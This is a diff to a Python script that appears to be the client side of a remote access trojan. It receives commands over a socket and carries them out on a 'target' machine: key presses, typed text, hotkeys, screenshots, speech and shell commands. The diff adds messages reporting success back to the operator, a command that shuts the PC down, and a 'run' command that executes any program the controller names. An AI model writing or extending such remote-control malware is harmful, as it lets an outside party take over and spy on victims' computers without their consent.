@@ -35,14 +35,17 @@ def main():
                     if final_data.startswith("press"):
                         key = final_data.replace("press ","")
                         pyautogui.press(key)
+                        client.send(f"Successfully Press the Key{key}".encode("utf-8"))
                     #write
                     if final_data.startswith("write"):
                         write = final_data.replace("write ","")
                         pyautogui.write(write,interval=0.1)
+                        client.send(f"Successfully Write The Given Text on target : {write}".encode("utf-8"))
                     #hotkey
                     if final_data.startswith("hotkey"):
                         hotkey = final_data.replace("hotkey ","").split("+")
                         pyautogui.hotkey(*hotkey)
+                        client.send(f"Successfully Press The hotkey on target".encode("utf-8"))
                     if final_data.startswith("ss"):
                         img = pyautogui.screenshot()
                         buffer = io.BytesIO()
@@ -51,6 +54,17 @@ def main():
                     if final_data.startswith("speak"):
                         speak = final_data.replace("speak ","")
                         pyttsx3.speak(speak)
+                        client.send(f"Successfully Speak The Given Text on target".encode("utf-8"))
+                    if final_data.startswith("shutdown"):
+                        client.send("Succesfully Shutdown The PC".encode("utf-8"))
+                        pyautogui.hotkey("win+d")
+                        time.sleep(1)
+                        pyautogui.hotkey("alt+f4")
+                        time.sleep(0.5)
+                        pyautogui.press("enter")
+                    if final_data.startswith("run"):
+                        run_cmd = final_data.replace("run ","")
+                        subprocess.run([fr"{run_cmd}"])
                     if final_data.startswith("cmd"):
                         cmd = final_data.replace("cmd ","")
                         if cmd.startswith("cd"):
